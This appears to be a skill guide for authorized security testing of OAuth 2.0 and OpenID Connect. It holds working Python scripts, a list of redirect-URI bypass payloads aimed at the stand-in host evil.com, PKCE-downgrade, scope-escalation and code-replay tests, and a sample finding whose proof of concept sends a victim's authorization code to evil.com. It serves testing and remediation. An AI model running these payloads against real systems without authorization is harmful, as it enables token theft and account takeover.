---
name: testing-oauth2-implementation-flaws
description: >
  Tests OAuth 2.0 and OpenID Connect implementations for security flaws including authorization
  code interception, redirect URI manipulation, CSRF in OAuth flows, token leakage, scope
  escalation, and PKCE bypass. The tester evaluates the authorization server, client
  application, and token handling for common misconfigurations that enable account takeover
  or unauthorized access. Activates for requests involving OAuth security testing, OIDC
  vulnerability assessment, OAuth2 redirect bypass, or authorization code flow testing.
domain: cybersecurity
subdomain: api-security
tags: [api-security, oauth2, oidc, authentication, redirect-uri, token-security]
version: 1.0.0
author: mahipal
license: Apache-2.0
---
# Testing OAuth2 Implementation Flaws

## When to Use

- Assessing OAuth 2.0 authorization code flow for redirect URI validation weaknesses
- Testing OAuth client applications for CSRF protection (state parameter usage) and PKCE enforcement
- Evaluating token storage, transmission, and lifecycle management in OAuth implementations
- Testing scope escalation where clients request more permissions than authorized
- Assessing OpenID Connect implementations for ID token validation and nonce usage

**Do not use** without written authorization. OAuth testing may result in token theft or unauthorized access.

## Prerequisites

- Written authorization specifying the OAuth provider and client applications in scope
- Test OAuth client registered with the authorization server
- Burp Suite Professional for intercepting OAuth redirects and token flows
- Python 3.10+ with `requests` and `oauthlib` libraries
- Browser developer tools for observing OAuth redirect chains
- Knowledge of the OAuth 2.0 grant types in use (authorization code, implicit, client credentials)

## Workflow

### Step 1: OAuth Flow Reconnaissance

```python
import requests
import urllib.parse
import re
import hashlib
import base64
import secrets

AUTH_SERVER = "https://auth.example.com"
CLIENT_ID = "test-client-id"
REDIRECT_URI = "https://app.example.com/callback"
SCOPE = "openid profile email"

# Discover OAuth endpoints
well_known = requests.get(f"{AUTH_SERVER}/.well-known/openid-configuration")
if well_known.status_code == 200:
    config = well_known.json()
    print("OAuth/OIDC Configuration:")
    print(f"  Authorization: {config.get('authorization_endpoint')}")
    print(f"  Token: {config.get('token_endpoint')}")
    print(f"  UserInfo: {config.get('userinfo_endpoint')}")
    print(f"  JWKS: {config.get('jwks_uri')}")
    print(f"  Supported grants: {config.get('grant_types_supported')}")
    print(f"  Supported scopes: {config.get('scopes_supported')}")
    print(f"  PKCE methods: {config.get('code_challenge_methods_supported')}")
    auth_endpoint = config['authorization_endpoint']
    token_endpoint = config['token_endpoint']
else:
    # Try common paths
    for path in ["/authorize", "/oauth/authorize", "/oauth2/authorize", "/auth"]:
        resp = requests.get(f"{AUTH_SERVER}{path}", allow_redirects=False)
        if resp.status_code in (302, 400):
            print(f"Authorization endpoint found: {AUTH_SERVER}{path}")
            auth_endpoint = f"{AUTH_SERVER}{path}"
            break
```

### Step 2: Redirect URI Validation Testing

```python
# Test redirect_uri validation strictness
REDIRECT_BYPASS_PAYLOADS = [
    # Open redirect variations
    REDIRECT_URI,                                          # Legitimate
    "https://evil.com",                                    # Different domain
    "https://app.example.com.evil.com/callback",          # Subdomain of attacker
    "https://app.example.com@evil.com/callback",          # URL authority confusion
    f"{REDIRECT_URI}/../../../evil.com",                  # Path traversal
    f"{REDIRECT_URI}?next=https://evil.com",              # Parameter injection
    f"{REDIRECT_URI}#https://evil.com",                   # Fragment injection
    f"{REDIRECT_URI}%23evil.com",                         # Encoded fragment
    "https://app.example.com/callback/../../evil",        # Relative path
    "https://APP.EXAMPLE.COM/callback",                   # Case variation
    "https://app.example.com/Callback",                   # Path case variation
    "https://app.example.com/callback/",                  # Trailing slash
    "https://app.example.com/callback?",                  # Trailing question mark
    "http://app.example.com/callback",                    # HTTP downgrade
    "https://app.example.com:443/callback",               # Explicit port
    "https://app.example.com:8443/callback",              # Different port
    f"{REDIRECT_URI}/.evil.com",                          # Dot segment
    "https://app.example.com/callbackevil",               # Path prefix match
    "javascript://app.example.com/callback%0aalert(1)",   # JavaScript protocol
]

print("=== Redirect URI Validation Testing ===\n")
for redirect in REDIRECT_BYPASS_PAYLOADS:
    params = {
        "response_type": "code",
        "client_id": CLIENT_ID,
        "redirect_uri": redirect,
        "scope": SCOPE,
        "state": secrets.token_urlsafe(32),
    }
    resp = requests.get(auth_endpoint, params=params, allow_redirects=False)

    if resp.status_code == 302:
        location = resp.headers.get("Location", "")
        if "code=" in location or redirect in location:
            status = "ACCEPTED"
            if redirect != REDIRECT_URI:
                print(f"  [VULNERABLE] {redirect[:70]} -> Redirect accepted")
        else:
            status = "REDIRECTED"
    elif resp.status_code == 400:
        status = "REJECTED"
    else:
        status = f"HTTP {resp.status_code}"

    if redirect == REDIRECT_URI:
        print(f"  [BASELINE] {redirect[:70]} -> {status}")
```

### Step 3: State Parameter (CSRF) Testing

```python
# Test 1: Missing state parameter
params_no_state = {
    "response_type": "code",
    "client_id": CLIENT_ID,
    "redirect_uri": REDIRECT_URI,
    "scope": SCOPE,
}
resp = requests.get(auth_endpoint, params=params_no_state, allow_redirects=False)
if resp.status_code == 302 and "code=" in resp.headers.get("Location", ""):
    print("[CSRF] Authorization code issued without state parameter")

# Test 2: State parameter reuse
state_value = "fixed_state_value_123"
# Use same state for multiple authorization requests
for i in range(3):
    params = {**params_no_state, "state": state_value}
    resp = requests.get(auth_endpoint, params=params, allow_redirects=False)
    if resp.status_code == 302:
        location = resp.headers.get("Location", "")
        returned_state = urllib.parse.parse_qs(
            urllib.parse.urlparse(location).query).get("state", [None])[0]
        if returned_state == state_value:
            print(f"[INFO] Same state accepted on attempt {i+1} (check client-side validation)")

# Test 3: Token exchange without state validation (client-side check)
# Intercept the callback and try exchanging the code without state
print("\nNote: State validation is a client-side check. Verify the callback handler validates state.")
```

### Step 4: PKCE Bypass Testing

```python
# Test if PKCE (Proof Key for Code Exchange) is enforced

# Generate PKCE values
code_verifier = secrets.token_urlsafe(64)[:128]
code_challenge = base64.urlsafe_b64encode(
    hashlib.sha256(code_verifier.encode()).digest()
).decode().rstrip('=')

# Test 1: Authorization request without PKCE
params_no_pkce = {
    "response_type": "code",
    "client_id": CLIENT_ID,
    "redirect_uri": REDIRECT_URI,
    "scope": SCOPE,
    "state": secrets.token_urlsafe(32),
}
resp = requests.get(auth_endpoint, params=params_no_pkce, allow_redirects=False)
if resp.status_code == 302 and "code=" in resp.headers.get("Location", ""):
    print("[PKCE] Authorization code issued without PKCE challenge")

# Test 2: Token exchange without code_verifier
auth_code = "captured_auth_code"  # From intercept
token_resp = requests.post(token_endpoint, data={
    "grant_type": "authorization_code",
    "code": auth_code,
    "redirect_uri": REDIRECT_URI,
    "client_id": CLIENT_ID,
    # No code_verifier
})
if token_resp.status_code == 200:
    print("[PKCE] Token issued without code_verifier - PKCE not enforced")

# Test 3: Token exchange with wrong code_verifier
token_resp = requests.post(token_endpoint, data={
    "grant_type": "authorization_code",
    "code": auth_code,
    "redirect_uri": REDIRECT_URI,
    "client_id": CLIENT_ID,
    "code_verifier": "wrong_verifier_value_that_does_not_match",
})
if token_resp.status_code == 200:
    print("[PKCE] Token issued with wrong code_verifier - PKCE validation broken")

# Test 4: Downgrade from S256 to plain
params_plain_pkce = {
    **params_no_pkce,
    "code_challenge": code_verifier,  # Plain = verifier itself
    "code_challenge_method": "plain",
}
resp = requests.get(auth_endpoint, params=params_plain_pkce, allow_redirects=False)
if resp.status_code == 302:
    print("[PKCE] Plain challenge method accepted - vulnerable to interception")
```

### Step 5: Scope Escalation and Token Testing

```python
# Test 1: Request additional scopes beyond what's registered
elevated_scopes = [
    "openid profile email admin",
    "openid profile email write:users",
    "openid profile email delete:*",
    "openid profile email admin:full",
    "*",
]

for scope in elevated_scopes:
    params = {
        "response_type": "code",
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "scope": scope,
        "state": secrets.token_urlsafe(32),
    }
    resp = requests.get(auth_endpoint, params=params, allow_redirects=False)
    if resp.status_code == 302:
        location = resp.headers.get("Location", "")
        if "code=" in location:
            print(f"[SCOPE] Elevated scope accepted: {scope}")

# Test 2: Token reuse across clients
# Use a token from client A on client B's API
token_a = "access_token_from_client_a"
resp = requests.get("https://other-service.example.com/api/resource",
    headers={"Authorization": f"Bearer {token_a}"})
if resp.status_code == 200:
    print("[TOKEN] Token from client A accepted by different service (audience not validated)")

# Test 3: Refresh token theft and reuse
refresh_token = "captured_refresh_token"
# Try using refresh token with different client_id
token_resp = requests.post(token_endpoint, data={
    "grant_type": "refresh_token",
    "refresh_token": refresh_token,
    "client_id": "different-client-id",
})
if token_resp.status_code == 200:
    print("[TOKEN] Refresh token accepted for different client - not bound to client")
```

### Step 6: Implicit Flow and Token Leakage Testing

```python
# Test if implicit flow is enabled (should be disabled per OAuth 2.1)
implicit_params = {
    "response_type": "token",
    "client_id": CLIENT_ID,
    "redirect_uri": REDIRECT_URI,
    "scope": SCOPE,
    "state": secrets.token_urlsafe(32),
}
resp = requests.get(auth_endpoint, params=implicit_params, allow_redirects=False)
if resp.status_code == 302:
    location = resp.headers.get("Location", "")
    if "access_token=" in location:
        print("[IMPLICIT] Implicit flow enabled - token in URL fragment (deprecated/insecure)")

# Test token leakage via Referer header
# Check if tokens appear in URLs that could leak via Referer
print("\nToken Leakage Checks:")
print("  - Check if access tokens appear in URL query parameters")
print("  - Check if tokens are logged in server access logs")
print("  - Check if callback URL with code is cached by the browser")
print("  - Check if the authorization code is single-use (replay test)")

# Authorization code replay test
auth_code_to_replay = "captured_auth_code"
for attempt in range(3):
    token_resp = requests.post(token_endpoint, data={
        "grant_type": "authorization_code",
        "code": auth_code_to_replay,
        "redirect_uri": REDIRECT_URI,
        "client_id": CLIENT_ID,
        "client_secret": "client_secret_value",
    })
    print(f"  Code replay attempt {attempt+1}: {token_resp.status_code}")
    if attempt > 0 and token_resp.status_code == 200:
        print("  [VULNERABLE] Authorization code is not single-use")
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Authorization Code Flow** | OAuth 2.0 flow where the client receives an authorization code via redirect, then exchanges it for tokens at the token endpoint |
| **PKCE** | Proof Key for Code Exchange - extension that binds the authorization request to the token request using a code verifier/challenge, preventing authorization code interception |
| **Redirect URI Validation** | Authorization server verification that the redirect_uri matches the registered value exactly, preventing code/token theft via open redirect |
| **State Parameter** | Random value passed in the authorization request and verified in the callback to prevent CSRF attacks on the OAuth flow |
| **Scope Escalation** | Requesting or obtaining more permissions (scopes) than the client is authorized for, enabling unauthorized access |
| **Implicit Flow** | Deprecated OAuth flow that returns tokens directly in the URL fragment, vulnerable to token leakage and replay attacks |

## Tools & Systems

- **Burp Suite Professional**: Intercept and manipulate OAuth redirects, authorization codes, and token exchanges
- **EsPReSSO (Burp Extension)**: Automated testing of OAuth and OpenID Connect implementations for known vulnerabilities
- **oauth2-security-tester**: Dedicated tool for testing OAuth 2.0 flows against common attack patterns
- **OWASP ZAP**: Passive scanner that detects OAuth misconfigurations in intercepted traffic
- **jwt.io**: Online JWT decoder for analyzing OAuth access tokens and ID tokens

## Common Scenarios

### Scenario: Social Login OAuth Implementation Assessment

**Context**: A web application implements "Login with Google" and "Login with GitHub" using OAuth 2.0 Authorization Code flow. The application is a SaaS platform where account takeover has high business impact.

**Approach**:
1. Analyze the OAuth configuration at `/.well-known/openid-configuration` for both providers
2. Test redirect URI validation: discover that the application registers `https://app.example.com/callback` but the server accepts `https://app.example.com/callback/..%2fevil`
3. Test state parameter: authorization request includes state but the callback handler does not validate it (CSRF possible)
4. Test PKCE: not implemented for the authorization code flow, making code interception possible on mobile
5. Test implicit flow: still enabled despite not being used by the application
6. Test scope: application requests `openid profile email` but the authorization server also grants `read:repos` without explicit consent
7. Test authorization code replay: code can be exchanged twice, indicating lack of single-use enforcement
8. Test token audience: access token from Google login accepted by GitHub API endpoint (audience not validated)

**Pitfalls**:
- Only testing the OAuth flow in the browser without intercepting and manipulating redirect parameters
- Not testing both the authorization request and the token exchange independently
- Missing open redirect vulnerabilities in the application that can be chained with OAuth redirect_uri
- Not testing the state parameter validation on the client side (server may include it but client may not check it)
- Assuming PKCE is enforced because the authorization server supports it (client must also send it)

## Output Format

```
## Finding: OAuth2 Redirect URI Bypass Enables Authorization Code Theft

**ID**: API-OAUTH-001
**Severity**: Critical (CVSS 9.3)
**Affected Component**: OAuth 2.0 Authorization Code Flow
**Authorization Server**: auth.example.com

**Description**:
The authorization server's redirect_uri validation uses prefix matching
instead of exact string matching. An attacker can manipulate the redirect_uri
to redirect the authorization code to an attacker-controlled endpoint,
enabling account takeover. Additionally, PKCE is not enforced and the
state parameter is not validated by the client application.

**Proof of Concept**:
1. Craft authorization URL with manipulated redirect_uri:
   https://auth.example.com/authorize?response_type=code&client_id=app
   &redirect_uri=https://app.example.com/callback/../../../evil.com
   &scope=openid+profile+email&state=abc123
2. User authenticates and approves consent
3. Authorization code redirected to https://evil.com?code=AUTH_CODE&state=abc123
4. Attacker exchanges code at token endpoint (no PKCE required)
5. Attacker receives access token and ID token for victim's account

**Impact**:
Complete account takeover for any user who clicks a crafted OAuth login link.
The attacker gains full access to the user's profile, email, and any
resources the OAuth scope grants access to.

**Remediation**:
1. Implement exact string matching for redirect_uri validation (no wildcards, no prefix matching)
2. Enforce PKCE (S256 method) for all authorization code flow requests
3. Validate the state parameter in the callback handler before exchanging the code
4. Disable the implicit flow on the authorization server
5. Enforce single-use authorization codes with a short TTL (max 60 seconds)
6. Validate the audience (aud) claim in tokens before accepting them
```
